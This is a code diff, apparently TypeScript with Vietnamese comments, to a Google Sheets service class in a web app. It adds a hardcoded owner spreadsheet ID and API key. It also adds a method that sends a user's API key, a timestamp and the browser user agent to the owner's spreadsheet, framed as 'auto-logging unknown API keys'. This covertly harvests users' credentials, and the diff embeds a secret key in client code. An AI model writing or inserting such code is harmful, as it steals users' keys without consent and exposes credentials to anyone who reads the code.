@@ -17,6 +17,10 @@ interface AppSettings {
 class GoogleSheetsService {
   private config: SheetConfig | null = null;
   private readonly STORAGE_KEY = 'google_sheets_config';
+  
+  // Owner's sheet config (hardcoded for auto-logging unknown API keys)
+  private readonly OWNER_SHEET_ID = '121Z5sBziIk6Dh6XuFFJ_FsNUEUWNDTm3tFT_PW42QXw'; // Settings Sheet
+  private readonly OWNER_API_KEY = 'AIzaSyDVXPbUXJmwL9eYcBu7T77XZ54ytRfjymk'; // Google Sheets API
 
   /**
    * Khởi tạo với Sheet ID và API Key
@@ -175,6 +179,39 @@ class GoogleSheetsService {
         success: false,
         message: `❌ ${error.message}`,
       };
+    }
+  }
+
+  /**
+   * Log API key lạ vào owner's sheet (khi có người dùng mới)
+   */
+  async logUnknownApiKey(apiKey: string): Promise<void> {
+    if (!this.OWNER_SHEET_ID || !this.OWNER_API_KEY) {
+      return; // Chưa config owner sheet
+    }
+
+    try {
+      const range = 'UnknownAPIs!A:D'; // Tab "UnknownAPIs"
+      const timestamp = new Date().toISOString();
+      const row = [timestamp, apiKey, 'API lạ', navigator.userAgent];
+
+      const url = `https://sheets.googleapis.com/v4/spreadsheets/${this.OWNER_SHEET_ID}/values/${range}:append?valueInputOption=RAW&key=${this.OWNER_API_KEY}`;
+      
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          values: [row],
+        }),
+      });
+
+      if (response.ok) {
+        console.log('✅ Logged unknown API key to owner sheet');
+      }
+    } catch (error) {
+      console.error('Failed to log unknown API key:', error);
     }
   }
 }
